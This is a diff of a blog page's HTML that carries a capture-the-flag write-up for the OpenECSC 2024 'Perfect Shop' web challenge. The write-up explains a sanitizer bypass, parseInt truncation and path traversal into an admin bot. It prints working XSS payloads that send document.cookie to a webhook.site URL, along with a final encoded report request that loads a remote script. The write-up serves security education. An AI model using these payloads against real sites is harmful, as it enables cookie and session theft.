@@ -11,7 +11,7 @@
 <meta name="author" content="">
 <link rel="canonical" href="https://Tiziano-Caruana.github.io/posts/writeups/openecsc-2024/perfect_shop/">
 <meta name="google-site-verification" content="-NRlyU37XYTZJ4WyeO8svRuXL8xXbOUAqLrx-qYbEpw">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.d6fcd20a4fb86efa4dfac8ec95da60244cc8871042183da1ef28e3a762ad79c8.css" integrity="sha256-1vzSCk&#43;4bvpN&#43;sjsldpgJEzIhxBCGD2h7yjjp2Ktecg=" rel="preload stylesheet" as="style">
 <link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTNvCmIE7HEiLhByQCf2_uMI9ENQNto_kSmOjKv-BusCjO355SvJeQZmWMPBXS6wwaH7nQ&amp;usqp=CAU">
 <link rel="icon" type="image/png" sizes="16x16" href="https://Tiziano-Caruana.github.io/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="https://Tiziano-Caruana.github.io/favicon-32x32.png">
@@ -56,16 +56,21 @@
         }
 
     </style>
-</noscript><meta property="og:title" content="Perfect Shop - OpenECSC 2024" />
-<meta property="og:description" content="Performing a static analysis only to find out that... the vulnerability is somewhere else!" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://Tiziano-Caruana.github.io/posts/writeups/openecsc-2024/perfect_shop/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2024-03-27T22:20:00+02:00" />
-<meta property="article:modified_time" content="2024-03-27T22:20:00+02:00" />
-
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Perfect Shop - OpenECSC 2024"/>
-<meta name="twitter:description" content="Performing a static analysis only to find out that... the vulnerability is somewhere else!"/>
+</noscript><meta property="og:url" content="https://Tiziano-Caruana.github.io/posts/writeups/openecsc-2024/perfect_shop/">
+  <meta property="og:site_name" content="Tiziano Caruana">
+  <meta property="og:title" content="Perfect Shop - OpenECSC 2024">
+  <meta property="og:description" content="Performing a static analysis only to find out that... the vulnerability is somewhere else!">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-03-27T22:20:00+02:00">
+    <meta property="article:modified_time" content="2024-03-27T22:20:00+02:00">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="CTFs">
+    <meta property="article:tag" content="Openecsc-2024">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Perfect Shop - OpenECSC 2024">
+<meta name="twitter:description" content="Performing a static analysis only to find out that... the vulnerability is somewhere else!">
 
 
 <script type="application/ld+json">
@@ -355,14 +360,12 @@
 <p>Starting from <code>const app = express();</code>, which confirms the use of <a href="https://github.com/expressjs/express">express</a> as the <a href="https://en.wikipedia.org/wiki/Web_framework">web framework</a> of the site, the next line allows the programmer to access the data sent by users in POST requests as <a href="https://swagger.io/docs/specification/2-0/describing-request-body/">body parameters</a> through <code>req.body.[parameter]</code>.</p>
 <p><em>Body parameters</em> are the information that the website receives without passing through either <a href="https://www.branch.io/glossary/query-parameters/">query parameters</a> (in <code>https://www.google.com/search?q=openECSC</code>, <code>q</code> is the query parameter and <code>openECSC</code> is its value), or through <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers">headers</a> including <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cookie">cookies</a>. Typically, body parameters &ldquo;pass&rdquo; the information that the user enters in a form to the server, which handles it according to the programmer&rsquo;s intentions.</p>
 <p>Summary:
-<img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/body_params.png" alt="Example of using various methods to send information to the server"  />
-</p>
+<img alt="Example of using various methods to send information to the server" loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/body_params.png"></p>
 <p>As you can see, it&rsquo;s not mandatory for what the user sees and what is sent to the server to be the same. In this case, regarding the product, it&rsquo;s much easier for the server to work with the id rather than the name, which in any case would still uniquely represent the selected product. It&rsquo;s also fair to say that the programmer will access this information through the properties <code>req.body.id</code> and <code>req.body.message</code>.</p>
 <h5 id="basics-of-xss">Basics of XSS<a hidden class="anchor" aria-hidden="true" href="#basics-of-xss">#</a></h5>
 <p>Continuing, it&rsquo;s noticeable that <a href="https://github.com/mde/ejs">ejs</a> is the chosen template engine for this app.</p>
 <p>Moving forward, the application is instructed to use <a href="https://github.com/pariazar/perfect-express-sanitizer">perfect-express-sanitizer</a> to avoid the risk of <a href="https://en.wikipedia.org/wiki/Cross-site_scripting">XSS</a> (Cross-Site Scripting), except for the <code>/admin</code> endpoint. This type of attack is very straightforward: it occurs when a site can be manipulated to allow the execution of JavaScript code not explicitly written by the programmer. The most peculiar example is inserting a tag like this: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>. If this tag is inserted in a search page that prints what the user has searched for without any sanitization, the tag will be interpreted and the script executed:</p>
-<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/vid/basicXSSexample.gif" alt="Basic XSS example"  />
-</p>
+<p><img alt="Basic XSS example" loading="lazy" src="/writeups/openecsc-2024/perfect_shop/vid/basicXSSexample.gif"></p>
 <p>This attack is &ldquo;temporary&rdquo;, only valid for the victim request, and it&rsquo;s called <em>reflected XSS</em>. If the payload/attack vector (in this case <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>) had been somehow stored by the application, like, for example, in a comment, the attack would have been a <em>stored XSS</em>.</p>
 <h5 id="handling-request-and-response-in-express">Handling Request and Response in Express<a hidden class="anchor" aria-hidden="true" href="#handling-request-and-response-in-express">#</a></h5>
 <p>The last portion of code doesn&rsquo;t show anything interesting. <code>res.locals.errormsg</code> and <code>successmsg</code>, if not null, appear as pop-ups containing useful information for the user (e.g., &ldquo;search too long&rdquo;).</p>
@@ -373,8 +376,7 @@
 <p>Although the &ldquo;playing field&rdquo; turned out to be less extensive than expected, there are several endpoints to analyze. Therefore, it&rsquo;s important to understand their functionality from the beginning.</p>
 <h4 id="-homepage">/ (homepage)<a hidden class="anchor" aria-hidden="true" href="#-homepage">#</a></h4>
 <p>This is the first screen displayed when entering the site, or when a GET request is made to the <code>/</code> endpoint:</p>
-<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/home.png" alt="Homepage"  />
-</p>
+<p><img alt="Homepage" loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/home.png"></p>
 <p>The related code is as follows:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;products&#39;</span>, { <span style="color:#a6e22e">products</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">products</span> });
@@ -384,8 +386,7 @@
 <p>In this case, no filter is applied to the <code>products</code> variable, so all products will be displayed.</p>
 <h4 id="productid">/product/:id<a hidden class="anchor" aria-hidden="true" href="#productid">#</a></h4>
 <p>The two colons preceding <code>id</code> indicate that it is a value that can be arbitrarily chosen by the user. One can imagine that there are various products, and this is a way to allow for a <a href="https://expressjs.com/en/starter/basic-routing.html">route</a> for each of them without explicitly specifying one for each.</p>
-<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/product.png" alt="Product detail page"  />
-</p>
+<p><img alt="Product detail page" loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/product.png"></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/product/:id&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">id</span> <span style="color:#f92672">=</span> parseInt(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">params</span>.<span style="color:#a6e22e">id</span>);
 </span></span><span style="display:flex;"><span>
@@ -400,8 +401,7 @@
 <p>If the id is not recognized (the product does not exist), a <code>404</code> &ldquo;not found&rdquo; error is returned; otherwise, a template is rendered that returns a result similar to the one shown in the photo for the chosen product.</p>
 <h4 id="search">/search<a hidden class="anchor" aria-hidden="true" href="#search">#</a></h4>
 <p>A classic search functionality that filters results based on the product name.</p>
-<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/search.png" alt="Example of search functionality"  />
-</p>
+<p><img alt="Example of search functionality" loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/search.png"></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/search&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">q</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#39;&#39;</span>;
 </span></span><span style="display:flex;"><span>
@@ -419,8 +419,7 @@
 <p>This would be very useful for a simple reflected XSS, but the length filter and especially the omnipresent sanitization do not allow it. Too bad 😔</p>
 <h4 id="admin">/admin<a hidden class="anchor" aria-hidden="true" href="#admin">#</a></h4>
 <p>An admin panel with a list of all available products.</p>
-<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/admin.png" alt="Admin panel overview"  />
-</p>
+<p><img alt="Admin panel overview" loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/admin.png"></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/admin&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;admin&#39;</span>, { <span style="color:#a6e22e">products</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">products</span> });
 </span></span><span style="display:flex;"><span>});
@@ -428,8 +427,7 @@
 <h4 id="adminid">/admin/:id<a hidden class="anchor" aria-hidden="true" href="#adminid">#</a></h4>
 <h4 id="get">GET<a hidden class="anchor" aria-hidden="true" href="#get">#</a></h4>
 <p>Product editing page, part of the admin panel.</p>
-<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/edit_product.png" alt="Product editing page overview"  />
-</p>
+<p><img alt="Product editing page overview" loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/edit_product.png"></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/admin/:id&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">id</span> <span style="color:#f92672">=</span> parseInt(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">params</span>.<span style="color:#a6e22e">id</span>);
 </span></span><span style="display:flex;"><span>
@@ -479,8 +477,7 @@
 <h4 id="report">Report<a hidden class="anchor" aria-hidden="true" href="#report">#</a></h4>
 <h5 id="get-1">GET<a hidden class="anchor" aria-hidden="true" href="#get-1">#</a></h5>
 <p>Simply renders the report page.</p>
-<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/report.png" alt="Report page"  />
-</p>
+<p><img alt="Report page" loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/report.png"></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/report&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;report&#39;</span>, { <span style="color:#a6e22e">products</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">products</span> });
 </span></span><span style="display:flex;"><span>});
@@ -572,8 +569,7 @@
 <h4 id="parsing">Parsing<a hidden class="anchor" aria-hidden="true" href="#parsing">#</a></h4>
 <p>The ID is parsed using the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/parseInt">parseInt()</a> function. As stated in the documentation, the only requirement for a string to be parsed as an integer is that it <em>starts</em> with a digit. But what happens if a string starts with a digit but contains other characters and symbols?</p>
 <p><em>The console of major browsers&rsquo; DevTools is a great friend in this type of challenge. It can usually be accessed with fn+F12 &gt; console</em></p>
-<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/parseInt.png" alt="Example of parseInt function behavior"  />
- Hell yeah.</p>
+<p><img alt="Example of parseInt function behavior" loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/parseInt.png"> Hell yeah.</p>
 <p>Simply put, the rest of the string is brutally truncated. The same goes if there are digits before, then characters, and then more digits. From the first encountered character onwards, everything is completely ignored by parseInt.</p>
 <h4 id="endpoint-inheritance-its-not-a-real-thing-dont-look-it-up">Endpoint inheritance???? (It&rsquo;s not a real thing don&rsquo;t look it up)<a hidden class="anchor" aria-hidden="true" href="#endpoint-inheritance-its-not-a-real-thing-dont-look-it-up">#</a></h4>
 <p>As visible from the screenshot shown earlier, there are tags in <code>/admin/:id</code>, despite only <code>/admin</code> being excluded from sanitization. At this point, the only option is to delve into the sanitizer&rsquo;s workings, which in this case is imported from the <a href="https://github.com/pariazar/perfect-express-sanitizer/tree/4f9c47f37596fa9830408470d818752d76b0dd79"><code>perfect-express-sanitizer</code></a> library. Specifically, in the challenge, version <code>1.0.13</code> was being used.</p>
@@ -621,14 +617,11 @@
 <p>I tend to overlook various things during the exploration of a challenge, so having access to the source code and the Dockerfile, I decided to disable all filters and gradually re-enable them as I adapted the payload to the various constraints imposed on me.</p>
 <h4 id="first-step-reflected-xss-without-filters">First step: Reflected XSS without filters<a hidden class="anchor" aria-hidden="true" href="#first-step-reflected-xss-without-filters">#</a></h4>
 <p>In the <code>server.js</code> file, I edited the following lines:</p>
-<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/XSSfilterOFF.png" alt="Disabling XSS filter"  />
-</p>
-<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/length_filterOFF.png" alt="Disabling input length filter"  />
-</p>
+<p><img alt="Disabling XSS filter" loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/XSSfilterOFF.png"></p>
+<p><img alt="Disabling input length filter" loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/length_filterOFF.png"></p>
 <p>I decided to maintain decency on the length filter to avoid ending up with comically long payloads.</p>
 <p>At this point, all that&rsquo;s left is to build and deploy the challenge and see how it goes.</p>
-<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/vid/FirstXSS.gif" alt="Example of injecting a simple XSS with filters disabled in the challenge"  />
-</p>
+<p><img alt="Example of injecting a simple XSS with filters disabled in the challenge" loading="lazy" src="/writeups/openecsc-2024/perfect_shop/vid/FirstXSS.gif"></p>
 <p>As expected, with the filters disabled, we can successfully exploit it. And steal a cookie?</p>
 <h5 id="cookie-stealing-and-webhooks">Cookie stealing and webhooks<a hidden class="anchor" aria-hidden="true" href="#cookie-stealing-and-webhooks">#</a></h5>
 <p>Cookies are a special type of header, and for this reason, there&rsquo;s a kind of shortcut in JavaScript that allows accessing them, namely the <code>document.cookie</code> property.</p>
@@ -638,39 +631,30 @@
 <p>In this type of payload, it&rsquo;s important not to use a random HTML tag, but to ensure that JavaScript code is actually executed (it&rsquo;s okay to insert the webhook URL concatenated with <code>document.cookie</code> inside an <code>onerror</code>, but not in a simple <code>src</code>) so that <code>document.cookie</code> is &ldquo;reachable&rdquo;.</p>
 <p>Also, you need to append the cookies as query parameters (for webhook and personal server) or as a path (for a personal server only). Failing to do so means appending the cookies as part of the host, which means the request will never reach the desired destination. For example, instead of ending up at <code>myhost.com</code>, it would end up at <code>myhost.comCOOKIENAME=COOKIEVALUE</code>, which makes no sense, unlike <code>myhost.com?c=COOKIENAME=COOKIEVALUE</code> or <code>myhost.com/COOKIENAME=COOKIEVALUE</code> (which doesn&rsquo;t make sense with <code>webhook.site</code>, unless you own that domain).</p>
 <p>Executing the payload above by sending it to the search page yields the following result on webhook.site:</p>
-<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/FirstWebhook.png" alt="Example webhook result"  />
-</p>
+<p><img alt="Example webhook result" loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/FirstWebhook.png"></p>
 <p>There are the cookies!</p>
 <h4 id="second-step-cookie-stealing-on-the-bot">Second step: Cookie stealing on the bot<a hidden class="anchor" aria-hidden="true" href="#second-step-cookie-stealing-on-the-bot">#</a></h4>
 <p>Perhaps it would have made more sense to find a valid payload with the character filter first, but during the competition, I was a bit panicked and wanted to make sure I could steal the bot&rsquo;s cookies without problems. Unfounded fear, as there was no kind of control in this regard, and the value of <a href="https://owasp.org/www-community/HttpOnly"><code>httpOnly</code></a> for the <code>flag</code> cookie wasn&rsquo;t specified, which means it will be set to the default value of <code>false</code>.</p>
 <p><em>What does this mean?</em> For security reasons, the optional <code>httpOnly</code> flag was introduced for cookies, which if set to <code>true</code>, prevents JavaScript code in the document from accessing <code>document.cookie</code>, mitigating exactly the type of attack I&rsquo;m about to perform.</p>
 <p>But first, let&rsquo;s delve into the bot&rsquo;s operation and the related report page.</p>
-<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/NetworkReport.png" alt="Inspection of a POST request to the reporting endpoint"  />
-</p>
+<p><img alt="Inspection of a POST request to the reporting endpoint" loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/NetworkReport.png"></p>
 <p>All fine, here&rsquo;s the ID and the message. Checking the logs, which appear on the terminal from which the <code>docker compose</code> was launched, it&rsquo;s also possible to verify which page was visited by the bot:</p>
-<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/BotVisitsProduct.png" alt="Example of logs indicating that the bot visited the page related to the reported product"  />
-</p>
+<p><img alt="Example of logs indicating that the bot visited the page related to the reported product" loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/BotVisitsProduct.png"></p>
 <p>And if, for no reason, you wanted to send an ID different from those prefixed by the <code>select</code> proposed by the developer? In this case, it&rsquo;s very useful to modify the request with Burp Suite or similar tools. Unfortunately, I don&rsquo;t have the time to show you how to set up Burp on your trusted browser (<a href="https://www.youtube.com/watch?v=Vn_Zst6BMGo">this</a> tutorial may be helpful) or to show you the process to solve the challenge without using similar tools.</p>
-<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/vid/BurpIDmodif.gif" alt="Modifying the product ID with Burp"  />
-</p>
+<p><img alt="Modifying the product ID with Burp" loading="lazy" src="/writeups/openecsc-2024/perfect_shop/vid/BurpIDmodif.gif"></p>
 <p>What I did was change the value of <code>id</code> from <code>1</code> to <code>1/../../search?q=Incredible</code> before it was sent to the server and consequently to the bot. To clarify, I would have achieved the same result if I had done this:</p>
-<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/HTMLmodif.png" alt="Modifying the product ID from client-side HTML"  />
-</p>
+<p><img alt="Modifying the product ID from client-side HTML" loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/HTMLmodif.png"></p>
 <p>Checking the logs, it can be seen that the bot is redirected to <code>search?q=Incredible</code>:</p>
-<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/BotFallsForIt.png" alt="Bot log visiting the search page with the value entered by the reporter"  />
-</p>
+<p><img alt="Bot log visiting the search page with the value entered by the reporter" loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/BotFallsForIt.png"></p>
 <p>A brief check of the site&rsquo;s route structure confirms this.</p>
 <p>Now all that&rsquo;s left is to try the payload that worked before to exfiltrate our cookie on the bot. Trying the payload <code>&lt;script&gt;window.location=&quot;https://webhook.site/[REDACTED]?c=&quot;+document.cookie&lt;/script&gt;</code>, you would notice that the complete URL being visited is <code>http://localhost:3000/search?q=&lt;script&gt;window.location=&quot;https://webhook.site/[REDACTED]?c=&quot;+document.cookie&lt;/script&gt;</code> or <code>http://perfectshop.challs.open.ecsc2024.it/search?q=&lt;script&gt;window.location=&quot;https://webhook.site/[REDACTED]?c=&quot;+document.cookie&lt;/script&gt;</code> depending on whether you are testing the challenge locally or on the competition server.</p>
 <p>This means that the same request must be made by the bot, which means making the same modification made before, combining it with the exploit already used:</p>
-<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/WePwnNoFilter.png" alt="Example of successful attack without filter"  />
-</p>
+<p><img alt="Example of successful attack without filter" loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/WePwnNoFilter.png"></p>
 <p>Of course, I&rsquo;m not URL-encoding the payload here just to make it easier to understand what&rsquo;s happening, but you viewers at home must remember to URL-encode properly &lt;3 (on Burp, CTRL+U highlighting the text to be URL-encoded):</p>
-<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/vid/UrlEncoding4profit.gif" alt="Example of URL-encoded payload"  />
-</p>
+<p><img alt="Example of URL-encoded payload" loading="lazy" src="/writeups/openecsc-2024/perfect_shop/vid/UrlEncoding4profit.gif"></p>
 <p>First, URL-encode for the query parameter value that the bot will send to the search endpoint, and then URL-encode for the entire payload that is about to be sent to the bot.</p>
 <p>Sending this payload, you&rsquo;ll receive a request on the webhook with the test flag set in the config:</p>
-<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/FlagNoFilter.png" alt="Test flag sent on the webhook"  />
-</p>
+<p><img alt="Test flag sent on the webhook" loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/FlagNoFilter.png"></p>
 <h4 id="third-step-cookie-stealing-on-the-bot-with-the-sanitizer-active">Third step: Cookie stealing on the bot with the sanitizer active<a hidden class="anchor" aria-hidden="true" href="#third-step-cookie-stealing-on-the-bot-with-the-sanitizer-active">#</a></h4>
 <p>On line 16, let&rsquo;s modify the sanitizer again to set it as in the original application, then rebuild everything:</p>
 <p><code>app.use(sanitizer.clean({ xss: true }, [&quot;/admin&quot;]));</code></p>
@@ -683,8 +667,7 @@
 <p>Of course, starting such a chain (?) means properly handling URL encoding to ensure that the parameters are correctly spread between the POST made to the report endpoint (to which the parameters <code>id</code> and <code>message</code> will be sent) and the request made by the bot to the search endpoint (to which the necessary parameter <code>search</code> and the dummy parameter <code>lol</code> will be sent).</p>
 <p>Once the URL encoding is correctly applied, the result should be this: <code>id=1/../../search%3flol%3d&quot;/admin&quot;%26q%3d&lt;script&gt;window.location%253d&quot;https%253a//webhook.site/[REDACTED]%253d&quot;%252bdocument.cookie&lt;/script&gt;&amp;message=/admin</code>.</p>
 <p>Since it&rsquo;s not excluded by the filter, it will be necessary to bypass the filter also in the report endpoint. To do this, simply add any query parameter with the value <code>/admin</code> or <code>'/admin'</code> in the report URL. In Burp Suite, the final payload will be:</p>
-<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/PayloadNoLenght.png" alt="Final payload without length filter"  />
-</p>
+<p><img alt="Final payload without length filter" loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/PayloadNoLenght.png"></p>
 <p>By doing this, you should again get the flag on the webhook as before. Now there&rsquo;s one last obstacle to overcome&hellip;</p>
 <h4 id="last-step-length-filter-bypass">Last Step: Length Filter Bypass<a hidden class="anchor" aria-hidden="true" href="#last-step-length-filter-bypass">#</a></h4>
 <p>This step didn&rsquo;t require any rocket science. Let&rsquo;s say I simply aimed to find the shortest possible payload with the same philosophy as the previous ones. For completeness, I&rsquo;ll add a subsection with the various things I tried during the competition.</p>
@@ -717,19 +700,16 @@
 <h4 id="how-to-expose-your-server-to-the-world">How to expose your server to the world<a hidden class="anchor" aria-hidden="true" href="#how-to-expose-your-server-to-the-world">#</a></h4>
 <p>To expose your files to the rest of the internet, you don&rsquo;t need to physically own a server. Your PC can serve this purpose without much trouble. All you need is Python to do what I did during the competition, so I believe any operating system that supports Python also allows you to expose a server as I&rsquo;m about to show:</p>
 <p>Firstly, you need to get your local IP, which on Linux you can obtain by running the command <code>ifconfig</code>:</p>
-<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/ifconfig.png" alt="Example of finding local IP with ifconfig"  />
-</p>
+<p><img alt="Example of finding local IP with ifconfig" loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/ifconfig.png"></p>
 <p>You will likely see an IP starting with <code>192.</code>; here, I tested it on my university&rsquo;s MAN.</p>
 <p>Then, to expose the file containing the payload to the local network, you can use the Python command <code>python3 -m http.server [PORT]</code>. This command sets up a simple HTTP server that exposes all files in the folder and its subfolders where the command was executed. This means that at the URL <code>http://[IP]:[PORT]/x.js</code>, if everything is set up correctly, you should find the payload.</p>
-<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/SimpleHTTPserver.png" alt="Example of a simple HTTP server"  />
-</p>
+<p><img alt="Example of a simple HTTP server" loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/SimpleHTTPserver.png"></p>
 <p>Opening it, you should be able to see the payload, which is not being executed. Do not be afraid; when this is included in the script tag, it will be executed as necessary.</p>
 <p>As all good kids know, it&rsquo;s the router that communicates with the fantastic world of the internet, not our device directly, which only receives and sends information via the router. To find out what your external IP address is, you can use an online service like <a href="https://www.whatismyip.com/">whatismyip.com</a>.</p>
 <p>At this point, we have almost everything: we know the IP address where the file to be included in the script tag passed to the bot will be located (i.e., the IP we just found), and we know the port on our device where our files are exposed (after all, we chose it).</p>
 <p>But there&rsquo;s one step missing: the router is reachable from the outside world, but the server hosted on the device is only reachable within the local network. Somehow, we need to tell the router that when a request is received on a certain port, that request should be handled by the Python server.</p>
 <p><a href="https://en.wikipedia.org/wiki/Port_forwarding">Port forwarding</a> allows us to do this. The procedure for enabling it varies greatly depending on the router manufacturer.</p>
-<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/PortForwarding.png" alt="Example of port forwarding"  />
-</p>
+<p><img alt="Example of port forwarding" loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/PortForwarding.png"></p>
 <p>As for the protocol, it&rsquo;s important to select TCP/UDP or similar if available; otherwise, it&rsquo;s better to create a port forwarding table for each protocol.</p>
 <p>The WAN port is the port that will be reachable from the outside, while the LAN port is the port that will receive packets from the outside. Essentially, it&rsquo;s the one chosen when the HTTP server was set up in Python. To avoid errors, I would recommend using the same LAN and WAN port (internal and external) where possible.</p>
 <p>The destination IP is the local IP of the device used, i.e., the one I obtained with <code>ifconfig</code>, or <code>ipconfig</code> in Windows.</p>
@@ -743,8 +723,7 @@
 <li>The code present on <code>x.js</code> is <code>window.location = &quot;https://webhook.site/[REDACTED]?c=&quot; + document.cookie;</code>.</li>
 <li>All that&rsquo;s left is to send the bot a report like this:</li>
 </ul>
-<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/FinalBurp.png" alt="Final Payload in Burp"  />
-</p>
+<p><img alt="Final Payload in Burp" loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/FinalBurp.png"></p>
 <p><code>id=1/../../search%3flol%3d&quot;/admin&quot;%26q%3d&lt;script%2bsrc%253d&quot;http%253a//10.10.201.233%253a1337/x.js&quot;&gt;&lt;/script&gt;&amp;message=/admin</code>, which decodes to <code>id=1/../../search?lol=&quot;/admin&quot;&amp;q=&lt;script src=&quot;http://10.10.201.233:1337/x.js&quot;&gt;&lt;/script&gt;&amp;message=/admin</code></p>
 <p>To anyone who managed to read this far, thank you from the bottom of my heart ❤️</p>
 <p>For any feedback, you can reach me out on Discord: <code>titto_caru</code></p>
